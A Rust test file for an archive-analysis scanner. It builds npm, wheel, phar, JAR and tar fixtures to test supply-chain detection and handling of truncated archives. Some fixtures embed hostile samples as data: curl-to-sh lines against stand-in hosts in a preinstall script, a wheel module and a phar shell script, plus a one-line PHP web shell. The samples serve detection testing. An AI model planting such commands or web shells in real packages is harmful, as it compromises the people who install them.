    zip.start_file("package.json", options).unwrap();
    std::io::Write::write_all(&mut zip, br#"{"name": "test-package", "version": "1.0.0"}"#)
        .unwrap();

    // Add a shell script (could be suspicious in npm context)
    zip.start_file("install.sh", options).unwrap();
    std::io::Write::write_all(
        &mut zip,
        b"#!/bin/sh\necho 'Installing...'\ncurl http://example.com/payload",
    )
    .unwrap();

    zip.finish().unwrap();

    // Analyze without a capability mapper (just verify structure)
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&zip_path);

    assert!(result.is_ok(), "Archive analysis should succeed");
    let report = result.unwrap();

    // Verify archive contents include both files
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path == "package.json"),
        "Should have package.json entry"
    );
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path == "install.sh"),
        "Should have install.sh entry"
    );
}

#[test]
fn tar_member_at_26_directory_depth_is_analyzed() {
    let temp_dir = tempfile::tempdir().unwrap();
    let tar_path = temp_dir.path().join("deep-member.tar");
    let file = File::create(&tar_path).unwrap();
    let mut tar = tar::Builder::new(file);

    // The pnpm archive has real source files below 11- and 12-level
    // node_modules paths. Keep coverage beyond that layout, including the
    // 26-single-letter-directory pattern that the old cap skipped.
    let member_path = format!("{}/payload.js", vec!["a"; 26].join("/"));
    let payload = b"const marker = 'archive-depth-regression-sentinel';\n";
    let mut header = tar::Header::new_gnu();
    header.set_path(&member_path).unwrap();
    header.set_size(payload.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, &payload[..]).unwrap();
    tar.finish().unwrap();

    let report = ArchiveAnalyzer::new()
        .analyze(&tar_path)
        .expect("analyze deep-member TAR");

    let member = report
        .files
        .iter()
        .find(|file| file.path.ends_with(&member_path))
        .expect("26-directory-deep member should be analyzed");
    assert_eq!(member.file_type, "javascript");
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "metadata/archive/parsing::partial-extraction")
    );
}

#[test]
fn test_container_composite_with_capability_mapper() {
    // Test that container-level composite evaluation runs when a capability mapper is present.
    // This uses the full traits directory to verify end-to-end integration.

    // Skip test if traits directory doesn't exist (CI environment may not have it)
    let traits_path = std::path::Path::new("traits");
    if !traits_path.exists() {
        eprintln!("Skipping test: traits directory not found");
        return;
    }

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("npm-package.zip");

    // Create a ZIP mimicking an npm package with suspicious elements
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // Add package.json
    zip.start_file("package.json", options).unwrap();
    std::io::Write::write_all(
        &mut zip,
        br#"{"name": "test", "scripts": {"preinstall": "node setup.js"}}"#,
    )
    .unwrap();

    // Add a JavaScript file with exec patterns
    zip.start_file("setup.js", options).unwrap();
    std::io::Write::write_all(
        &mut zip,
        b"const { exec } = require('child_process');\nexec('curl http://evil.com | sh');",
    )
    .unwrap();

    zip.finish().unwrap();

    // Create analyzer with capability mapper
    let mapper = crate::capabilities::CapabilityMapper::empty();
    let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

    let result = analyzer.analyze(&zip_path);
    assert!(result.is_ok(), "Archive analysis should succeed");

    let report = result.unwrap();

    // The analysis should complete and produce a report with archive contents
    assert!(!report.archive_contents.is_empty());

    // If container-level composites fired, they would be in report.findings
    // (The exact findings depend on the rules in the traits directory)
    // This test verifies the pipeline runs without errors

    // Also verify that nested file analysis produces FileAnalysis entries
    // with findings that can be used for container-level evaluation
    if !report.files.is_empty() {
        // At least one file should have been analyzed
        let total_nested_findings: usize = report.files.iter().map(|f| f.findings.len()).sum();
        // Log for debugging - actual count depends on trait rules
        eprintln!(
            "Container test: {} files with {} total findings",
            report.files.len(),
            total_nested_findings
        );
    }
}

// =========================================================================
// Supply chain binary anomaly detection tests
// =========================================================================

#[test]
fn test_npm_package_with_exe_detection() {
    // Test that an NPM package containing a .exe file triggers the supply chain rule.
    // This simulates a malicious NPM package with an embedded Windows binary.

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("malicious-npm.tgz");

    // Create a tarball mimicking an npm package with an embedded .exe
    {
        let file = File::create(&zip_path).unwrap();
        let gz = flate2::write::GzEncoder::new(file, flate2::Compression::default());
        let mut tar = tar::Builder::new(gz);

        // Add package.json
        let package_json = br#"{"name": "totally-legit-package", "version": "1.0.0"}"#;
        let mut header = tar::Header::new_gnu();
        header.set_path("package/package.json").unwrap();
        header.set_size(package_json.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append(&header, &package_json[..]).unwrap();

        // Add a suspicious .exe file (just the filename triggers the rule)
        let fake_exe = b"MZ"; // PE magic bytes
        let mut header = tar::Header::new_gnu();
        header.set_path("package/evil.exe").unwrap();
        header.set_size(fake_exe.len() as u64);
        header.set_mode(0o755);
        header.set_cksum();
        tar.append(&header, &fake_exe[..]).unwrap();

        // Finish writes the tar footer, into_inner flushes and finishes the gz stream
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }

    // Analyze with capability mapper
    let mapper = make_archive_test_mapper();
    let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

    let result = analyzer.analyze(&zip_path);
    assert!(
        result.is_ok(),
        "Archive analysis should succeed: {:?}",
        result.err()
    );

    let report = result.unwrap();

    // Check for the supply chain binary anomaly finding
    let has_supply_chain_finding = report.findings.iter().any(|f| {
        f.id.contains("npm-package-with-exe") || f.id.contains("script-package-with-windows-binary")
    }) || report.files.iter().any(|file| {
        file.findings.iter().any(|f| {
            f.id.contains("npm-package-with-exe")
                || f.id.contains("script-package-with-windows-binary")
        })
    });

    // Log findings for debugging
    eprintln!("NPM+exe test findings:");
    for finding in &report.findings {
        if finding.id.contains("supply-chain") || finding.id.contains("npm") {
            eprintln!("  - {} ({:?})", finding.id, finding.crit);
        }
    }

    assert!(
        has_supply_chain_finding,
        "Should detect NPM package with .exe as supply chain anomaly"
    );
}

#[test]
fn test_npm_package_with_png_detection() {
    // Test that an NPM package containing a PNG file triggers the notable finding.

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("npm-with-image.zip");

    // Create a ZIP mimicking an npm package with a PNG
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // Add package.json
    zip.start_file("package.json", options).unwrap();
    std::io::Write::write_all(
        &mut zip,
        br#"{"name": "image-package", "version": "1.0.0"}"#,
    )
    .unwrap();

    // Add a PNG file (with PNG magic bytes)
    zip.start_file("assets/hidden.png", options).unwrap();
    std::io::Write::write_all(&mut zip, b"\x89PNG\r\n\x1a\n").unwrap();

    zip.finish().unwrap();

    // Analyze with capability mapper
    let mapper = make_archive_test_mapper();
    let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

    let result = analyzer.analyze(&zip_path);
    assert!(result.is_ok(), "Archive analysis should succeed");

    let report = result.unwrap();

    // Check for the image anomaly finding
    let has_image_finding = report
        .findings
        .iter()
        .any(|f| f.id.contains("npm-package-with-image") || f.id.contains("archive-has-png"))
        || report.files.iter().any(|file| {
            file.findings
                .iter()
                .any(|f| f.id.contains("archive-has-png"))
        });

    // Log findings for debugging
    eprintln!("NPM+PNG test findings:");
    for finding in &report.findings {
        eprintln!("  - {} ({:?})", finding.id, finding.crit);
    }

    // Note: This test may not find the composite if the component traits
    // are not yet evaluated at container level. The test verifies the
    // infrastructure is working.
    if !has_image_finding {
        eprintln!(
            "Warning: npm-package-with-image rule not triggered. \
                This may be expected if container-level composites need the component traits."
        );
    }
}

#[test]
fn test_python_package_with_dll_detection() {
    // Test that a Python package containing a .dll file triggers the supply chain rule.

    let temp_dir = tempfile::tempdir().unwrap();
    let whl_path = temp_dir.path().join("malicious-1.0.0-py3-none-any.whl");

    // Create a wheel (ZIP) mimicking a Python package with an embedded DLL
    let file = File::create(&whl_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // Add setup.py content
    zip.start_file("setup.py", options).unwrap();
    std::io::Write::write_all(
        &mut zip,
        b"from setuptools import setup\nsetup(name='malicious')",
    )
    .unwrap();

    // Add a suspicious .dll file
    zip.start_file("malicious/payload.dll", options).unwrap();
    std::io::Write::write_all(&mut zip, b"MZ").unwrap(); // PE magic

    // Add package metadata
    zip.start_file("malicious-1.0.0.dist-info/METADATA", options)
        .unwrap();
    std::io::Write::write_all(&mut zip, b"Name: malicious\nVersion: 1.0.0").unwrap();

    zip.finish().unwrap();

    // Analyze with capability mapper
    let mapper = make_archive_test_mapper();
    let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

    let result = analyzer.analyze(&whl_path);
    assert!(result.is_ok(), "Archive analysis should succeed");

    let report = result.unwrap();

    // Check for the supply chain binary anomaly finding
    let has_supply_chain_finding = report.findings.iter().any(|f| {
        f.id.contains("python-package-with-dll")
            || f.id.contains("script-package-with-windows-binary")
    }) || report.files.iter().any(|file| {
        file.findings.iter().any(|f| {
            f.id.contains("python-package-with-dll")
                || f.id.contains("script-package-with-windows-binary")
        })
    });

    assert!(
        has_supply_chain_finding,
        "Should detect Python package with .dll as supply chain anomaly"
    );
}

/// A native phar, built the way `ext/phar` lays one out: a stub ending in
/// `__HALT_COMPILER(); ?>`, a little-endian manifest, then each member's
/// stored or compressed bytes back to back. `(name, content, flags,
/// declared size, crc32)`; `None` takes the real value.
fn phar_bytes(members: &[(&str, Vec<u8>, u32, Option<u32>, Option<u32>)]) -> Vec<u8> {
    let mut manifest = Vec::new();
    manifest.extend_from_slice(&(members.len() as u32).to_le_bytes());
    manifest.extend_from_slice(&[0x11, 0x00]); // API 1.1.0
    manifest.extend_from_slice(&0u32.to_le_bytes()); // unsigned
    manifest.extend_from_slice(&6u32.to_le_bytes());
    manifest.extend_from_slice(b"t.phar");
    manifest.extend_from_slice(&0u32.to_le_bytes()); // no metadata
    let mut contents = Vec::new();
    for (name, content, flags, declared, crc) in members {
        let stored = match flags {
            0x1000 => {
                let mut e =
                    flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
                std::io::Write::write_all(&mut e, content).unwrap();
                e.finish().unwrap()
            }
            0x2000 => {
                let mut e = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
                std::io::Write::write_all(&mut e, content).unwrap();
                e.finish().unwrap()
            }
            _ => content.clone(),
        };
        let mut real_crc = flate2::Crc::new();
        real_crc.update(content);
        manifest.extend_from_slice(&(name.len() as u32).to_le_bytes());
        manifest.extend_from_slice(name.as_bytes());
        manifest.extend_from_slice(&declared.unwrap_or(content.len() as u32).to_le_bytes());
        manifest.extend_from_slice(&0u32.to_le_bytes()); // mtime
        manifest.extend_from_slice(&(stored.len() as u32).to_le_bytes());
        manifest.extend_from_slice(&crc.unwrap_or(real_crc.sum()).to_le_bytes());
        manifest.extend_from_slice(&(flags | 0o644).to_le_bytes());
        manifest.extend_from_slice(&0u32.to_le_bytes()); // no metadata
        contents.extend_from_slice(&stored);
    }
    let mut phar = b"<?php echo 'stub'; __HALT_COMPILER(); ?>\r\n".to_vec();
    phar.extend_from_slice(&(manifest.len() as u32).to_le_bytes());
    phar.extend_from_slice(&manifest);
    phar.extend_from_slice(&contents);
    phar
}

/// Every phar member is read from the manifest's offsets and analyzed as
/// its own file, the stub included, whatever its compression; a member
/// that inflates past its declared size is refused, and a CRC mismatch is
/// noted without dropping the member.
#[test]
fn phar_members_are_extracted_in_memory() {
    let temp_dir = tempfile::tempdir().unwrap();
    let path = temp_dir.path().join("sample.phar");
    let shell = b"#!/bin/sh\ncurl -s http://example.invalid/x | sh\n".to_vec();
    std::fs::write(
        &path,
        phar_bytes(&[
            (
                "bin/run.php",
                b"<?php system($_GET['c']);\n".to_vec(),
                0,
                None,
                None,
            ),
            (
                "lib/util.js",
                b"module.exports = (a) => a + 1;\n".to_vec(),
                0x1000,
                None,
                None,
            ),
            ("scripts/setup.sh", shell, 0x2000, None, None),
            ("bomb.txt", vec![b'A'; 4096], 0x1000, Some(16), None),
            (
                "bad-crc.txt",
                b"plain text member\n".to_vec(),
                0,
                None,
                Some(1),
            ),
        ]),
    )
    .unwrap();

    let report = ArchiveAnalyzer::new().analyze(&path).unwrap();
    assert!(
        report
            .metadata
            .tools_used
            .iter()
            .any(|t| t == "in_memory_phar"),
        "{:?}",
        report.metadata.tools_used
    );
    let member = |name: &str| report.files.iter().find(|f| f.path == name);
    for name in [
        ".phar/stub.php",
        "bin/run.php",
        "lib/util.js",
        "scripts/setup.sh",
        "bad-crc.txt",
    ] {
        assert!(
            member(name).is_some(),
            "{name} missing: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );
    }
    assert_eq!(member(".phar/stub.php").unwrap().file_type, "php");
    assert_eq!(member("scripts/setup.sh").unwrap().file_type, "shell");
    assert!(
        member("bomb.txt").is_none(),
        "an over-size member is not analyzed"
    );

    let notes: Vec<&str> = report
        .findings
        .iter()
        .flat_map(|f| f.evidence.iter().map(|e| e.value.as_str()))
        .collect();
    assert!(
        notes.iter().any(|n| n.starts_with("bomb.txt:")),
        "{notes:?}"
    );
    assert!(
        notes.iter().any(|n| n.contains("bad-crc.txt: CRC32")),
        "{notes:?}"
    );
}

#[test]
fn test_small_jar_uses_in_memory_selector() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let jar_path = temp_dir.path().join("sample.jar");
    let class_bytes =
        std::fs::read("tests/fixtures/java/HelloWorld.class").expect("java fixture present");

    {
        let file = File::create(&jar_path).expect("create jar");
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("META-INF/MANIFEST.MF", options).unwrap();
        std::io::Write::write_all(&mut zip, b"Manifest-Version: 1.0\nMain-Class: HelloWorld\n")
            .unwrap();
        zip.start_file("HelloWorld.class", options).unwrap();
        std::io::Write::write_all(&mut zip, &class_bytes).unwrap();
        zip.start_file("com/google/Benign.class", options).unwrap();
        std::io::Write::write_all(&mut zip, &class_bytes).unwrap();
        zip.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new();
    let report = analyzer.analyze(&jar_path).expect("analyze jar");
    assert!(
        report
            .metadata
            .tools_used
            .iter()
            .any(|t| t == "in_memory_jar"),
        "small JAR archives should use the in-memory JAR selector"
    );
    assert!(
        report
            .archive_contents
            .iter()
            .any(|entry| entry.path.ends_with("HelloWorld.class"))
    );
}

#[test]
fn test_analyze_zip_archive_members() {
    // Zip archives go through the JAR analysis path (is_jar=true for zip).
    // Non-class files in JARs only produce FileAnalysis entries if they are
    // recognized code types. Use .py files to ensure they get analyzed.
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let zip_path = temp_dir.path().join("test.zip");

    // Create a zip with Python files (recognized code types that get FileAnalysis entries)
    {
        #[allow(clippy::expect_used)]
        let file = File::create(&zip_path).expect("create zip");
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("hello.py", options).unwrap();
        std::io::Write::write_all(&mut zip, b"import os\nprint('hello')").unwrap();
        zip.start_file("subdir/data.py", options).unwrap();
        std::io::Write::write_all(&mut zip, b"import sys\nprint('data')").unwrap();
        zip.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&zip_path).expect("analyze zip");

    // Check that archive contents were recorded (all zips populate this)
    assert!(
        !report.archive_contents.is_empty(),
        "zip should have archive_contents"
    );

    for (name, content) in [
        ("hello.py", b"import os\nprint('hello')".as_slice()),
        ("subdir/data.py", b"import sys\nprint('data')".as_slice()),
    ] {
        let child = report
            .files
            .iter()
            .find(|f| f.path.ends_with(name))
            .expect("ZIP member should be analyzed");
        assert_eq!(child.sha256, calculate_sha256(content));
        assert_eq!(child.size, content.len() as u64);
    }
}

#[test]
fn test_analyze_tar_gz_archive_members() {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use tar::Builder;

    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let tar_gz_path = temp_dir.path().join("test.tar.gz");

    // Create a tar.gz with two files
    {
        let file = File::create(&tar_gz_path).unwrap();
        let enc = GzEncoder::new(file, Compression::default());
        let mut tar_builder = Builder::new(enc);

        let content_a = b"file alpha content";
        let mut header_a = tar::Header::new_gnu();
        header_a.set_path("alpha.txt").unwrap();
        header_a.set_size(content_a.len() as u64);
        header_a.set_mode(0o644);
        header_a.set_cksum();
        tar_builder.append(&header_a, &content_a[..]).unwrap();

        let content_b = b"file beta content";
        let mut header_b = tar::Header::new_gnu();
        header_b.set_path("subdir/beta.txt").unwrap();
        header_b.set_size(content_b.len() as u64);
        header_b.set_mode(0o644);
        header_b.set_cksum();
        tar_builder.append(&header_b, &content_b[..]).unwrap();

        tar_builder.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&tar_gz_path).expect("analyze tar.gz");

    for (name, content) in [
        ("alpha.txt", b"file alpha content".as_slice()),
        ("subdir/beta.txt", b"file beta content".as_slice()),
    ] {
        let child = report
            .files
            .iter()
            .find(|f| f.path.ends_with(name))
            .expect("tar.gz member should be analyzed");
        assert_eq!(child.sha256, calculate_sha256(content));
        assert_eq!(child.size, content.len() as u64);
    }
}

/// A ZIP entry whose unix mode says symlink is still an ordinary file to
/// every consumer that ignores unix modes: the JVM, Android and pip. Its
/// bytes must be analyzed, in memory and on disk, not only read as a target.
#[test]
fn zip_members_with_symlink_mode_are_analyzed() {
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("pkg.whl");
    let content = "import os\nos.system('curl http://x | sh')\n";
    {
        let mut zip = zip::ZipWriter::new(File::create(&zip_path).unwrap());
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.add_symlink("pkg/__init__.py", content, options)
            .unwrap();
        zip.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&zip_path).unwrap();
    let child = report
        .files
        .iter()
        .find(|f| f.path.ends_with("pkg/__init__.py"))
        .expect("symlink-mode member should be analyzed");
    assert_eq!(child.sha256, calculate_sha256(content.as_bytes()));

    let out = tempfile::tempdir().unwrap();
    let mut archive = zip::ZipArchive::new(File::open(&zip_path).unwrap()).unwrap();
    super::zip::extract_zip_entries_safe(&mut archive, out.path(), None, &ExtractionGuard::new())
        .unwrap();
    let extracted = out.path().join("pkg/__init__.py");
    assert!(std::fs::symlink_metadata(&extracted).unwrap().is_file());
    assert_eq!(std::fs::read_to_string(extracted).unwrap(), content);
}

/// A package can store its payload under any typeflag the installer treats
/// as a regular file: contiguous (`7`), or a flag POSIX leaves unassigned,
/// which tar-rs (cargo), Python `tarfile` (pip) and GNU tar all extract as a
/// file. Both the in-memory and the on-disk tar paths must read those bytes.
#[test]
fn tar_members_with_non_regular_file_typeflags_are_analyzed() {
    use tar::Builder;

    let temp_dir = tempfile::tempdir().unwrap();
    let tar_path = temp_dir.path().join("pkg.tar");
    let members: [(&str, tar::EntryType, &[u8]); 2] = [
        (
            "package/index.js",
            tar::EntryType::Continuous,
            b"require('child_process')",
        ),
        (
            "build.rs",
            tar::EntryType::new(b'Z'),
            b"fn main() { std::process::exit(0) }",
        ),
    ];
    {
        let mut tar_builder = Builder::new(File::create(&tar_path).unwrap());
        for (name, kind, content) in members {
            let mut header = tar::Header::new_gnu();
            header.set_path(name).unwrap();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(kind);
            header.set_cksum();
            tar_builder.append(&header, content).unwrap();
        }
        tar_builder.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&tar_path).unwrap();
    for (name, _, content) in members {
        let child = report.files.iter().find(|f| f.path.ends_with(name));
        assert!(child.is_some(), "{name} should be analyzed");
        assert_eq!(child.unwrap().sha256, calculate_sha256(content));
    }

    let out = tempfile::tempdir().unwrap();
    super::tar::extract_tar_entries_safe(
        File::open(&tar_path).unwrap(),
        out.path(),
        &ExtractionGuard::new(),
    )
    .unwrap();
    for (name, _, content) in members {
        assert_eq!(std::fs::read(out.path().join(name)).unwrap(), content);
    }
}

/// Build a gzip-wrapped tar of `members`, then cut it off after
/// `keep_fraction` of its bytes.
///
/// `Compression::none()` keeps the deflate stream as stored blocks so the
/// surviving prefix decodes to real tar bytes — with default compression a
/// small fixture is one block that yields nothing until its end, which is
/// not the shape being tested.
fn truncated_tar_gz(members: &[(&str, usize)], keep_fraction: f64) -> Vec<u8> {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use tar::Builder;

    let mut whole = Vec::new();
    {
        let enc = GzEncoder::new(&mut whole, Compression::none());
        let mut builder = Builder::new(enc);
        for (name, size) in members {
            // Printable filler so the extracted members look like text to
            // the member analyzers rather than unclassifiable binary.
            let content = vec![b'A'; *size];
            let mut header = tar::Header::new_gnu();
            header.set_path(name).unwrap();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append(&header, &content[..]).unwrap();
        }
        builder.into_inner().unwrap().finish().unwrap();
    }

    #[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)]
    let keep = (whole.len() as f64 * keep_fraction) as usize;
    whole.truncate(keep);
    whole
}

/// A truncated gzip stream is a real-world failure: an
/// extensionless blob, gzip magic, tar inside, cut off mid-member. It used
/// to abort the whole analysis with "unexpected end of file" and emit no
/// result at all, discarding megabytes of already-decoded members.
#[test]
fn truncated_gzip_analyzes_decoded_prefix() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    // No extension, exactly like a content-addressed blob on disk: the type
    // comes from the magic bytes, which routes to the single-stream gzip
    // path rather than the tar.gz one.
    let blob_path = temp_dir.path().join("deadbeefcafe");
    let truncated = truncated_tar_gz(
        &[
            ("alpha.txt", 40_000),
            ("beta.txt", 40_000),
            ("gamma.txt", 40_000),
        ],
        0.5,
    );
    std::fs::write(&blob_path, &truncated).unwrap();

    // Sanity: the fixture really is undecodable as a whole stream.
    {
        use std::io::Read;
        let mut sink = Vec::new();
        let err = flate2::read::GzDecoder::new(&truncated[..])
            .read_to_end(&mut sink)
            .unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::UnexpectedEof);
        assert!(!sink.is_empty(), "fixture should decode a usable prefix");
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer
        .analyze(&blob_path)
        .expect("truncated gzip should still produce a report");

    let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
    assert!(
        paths.iter().any(|p| p.contains("alpha.txt")),
        "members ahead of the cut should be analyzed, got: {paths:?}"
    );
    assert!(
        report
            .metadata
            .errors
            .iter()
            .any(|e| e.contains("ended early") || e.contains("stopped after")),
        "the partial decode should be recorded, got: {:?}",
        report.metadata.errors
    );
    let incomplete = report
        .findings
        .iter()
        .find(|f| f.id == "metadata/archive/parsing::partial-extraction")
        .expect("a partial read should raise the incomplete-archive finding");
    assert_eq!(
        incomplete.crit,
        Criticality::Notable,
        "an incomplete read is visible, not a verdict"
    );
    assert!(
        !incomplete.evidence.is_empty(),
        "the finding should carry the extraction notes as evidence"
    );
}

/// The counterpart: a clean archive must not pick up the finding.
#[test]
fn intact_tar_gz_raises_no_incomplete_finding() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let path = temp_dir.path().join("intact.tar.gz");
    // keep_fraction 1.0 — the same fixture, uncut.
    std::fs::write(
        &path,
        truncated_tar_gz(&[("alpha.txt", 4_000), ("beta.txt", 4_000)], 1.0),
    )
    .unwrap();

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&path).expect("analyze intact tar.gz");
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "metadata/archive/parsing::partial-extraction"),
        "an intact archive must not be flagged incomplete, errors: {:?}",
        report.metadata.errors
    );
}

/// The recovery is for streams that yield something. A file that is gzip by
/// magic but decodes to nothing has no prefix to fall back on, and the
/// caller is better served by the error than by an empty report.
#[test]
fn gzip_yielding_nothing_is_still_an_error() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let blob_path = temp_dir.path().join("headeronly");
    // A bare gzip header: enough to be typed as gzip, no deflate data.
    std::fs::write(
        &blob_path,
        [0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03],
    )
    .unwrap();

    let analyzer = ArchiveAnalyzer::new();
    assert!(
        analyzer.analyze(&blob_path).is_err(),
        "a gzip stream that decodes to nothing should stay an error"
    );
}

/// Same shape one level down: a `.tar.gz` truncated mid-member routes
/// through the tar extractor, which writes members to disk as it goes, so
/// the partial-extraction fallback keeps the ones ahead of the cut.
#[test]
fn truncated_tar_gz_keeps_members_ahead_of_the_cut() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let path = temp_dir.path().join("package.tar.gz");
    std::fs::write(
        &path,
        truncated_tar_gz(&[("alpha.txt", 40_000), ("beta.txt", 40_000)], 0.6),
    )
    .unwrap();

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer
        .analyze(&path)
        .expect("truncated tar.gz should still produce a report");
    let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
    assert!(
        paths.iter().any(|p| p.contains("alpha.txt")),
        "members ahead of the cut should be analyzed, got: {paths:?}"
    );
    // The member the cut lands in keeps the bytes read before it: droppers
    // ship their payload last, and a truncated copy is still evidence.
    assert!(
        paths.iter().any(|p| p.contains("beta.txt")),
        "the member cut mid-stream should be analyzed from its prefix, got: {paths:?}"
    );
}

#[test]
fn truncated_large_tar_member_keeps_exact_readable_prefix() {
    use std::io::Write;

    let temporary = tempfile::tempdir().unwrap();
    let path = temporary.path().join("truncated-large.tar.gz");
    let content = b"#!/bin/sh\necho readable-prefix\n";
    let mut header = tar::Header::new_gnu();
    header.set_path("payload.sh").unwrap();
    header.set_size(256 * 1024 * 1024);
    header.set_mode(0o644);
    header.set_cksum();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    encoder.write_all(header.as_bytes()).unwrap();
    encoder.write_all(content).unwrap();
    std::fs::write(&path, encoder.finish().unwrap()).unwrap();

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&path).unwrap();
    let child = report
        .files
        .iter()
        .find(|f| f.path.ends_with("payload.sh"))
        .unwrap();
    assert_eq!(child.sha256, calculate_sha256(content));
    assert_eq!(child.size, content.len() as u64);
    assert!(
        report
            .metadata
            .errors
            .iter()
            .any(|e| e.contains("stopped after")),
        "the TAR read error must remain visible: {:?}",
        report.metadata.errors
    );
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/archive/parsing::partial-extraction")
    );
}

/// The in-memory ZIP path holds every member in RAM, so there is no
/// temp_dir for the partial-extraction fallback to salvage. A member that
/// fails to read must cost that member only.
#[test]
fn truncated_zip_analyzes_readable_members() {
    use ::zip::write::SimpleFileOptions;

    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let path = temp_dir.path().join("truncated.zip");

    // Incompressible members, so each one occupies a large, findable span
    // of the file and corrupting a byte range lands in a payload rather
    // than in a header.
    let mut lcg: u32 = 0x1234_5678;
    let mut noise = |len: usize| -> Vec<u8> {
        (0..len)
            .map(|_| {
                lcg = lcg.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
                (lcg >> 24) as u8
            })
            .collect()
    };

    let member_len = 40_000;
    let mut whole = Vec::new();
    {
        let mut writer = ::zip::ZipWriter::new(std::io::Cursor::new(&mut whole));
        let options =
            SimpleFileOptions::default().compression_method(::zip::CompressionMethod::Deflated);
        for name in ["alpha.txt", "beta.txt", "gamma.txt"] {
            writer.start_file(name, options).unwrap();
            std::io::Write::write_all(&mut writer, &noise(member_len)).unwrap();
        }
        writer.finish().unwrap();
    }
    assert!(
        whole.len() > 2 * member_len,
        "members must stay incompressible for the corruption offset to land in a payload"
    );

    // Shred a span inside the first member's deflate stream. The central
    // directory and the other members' payloads keep their offsets, so the
    // archive still opens and exactly one member fails to read.
    let mut damaged = whole.clone();
    for byte in &mut damaged[1_000..member_len / 2] {
        *byte ^= 0xff;
    }
    std::fs::write(&path, &damaged).unwrap();

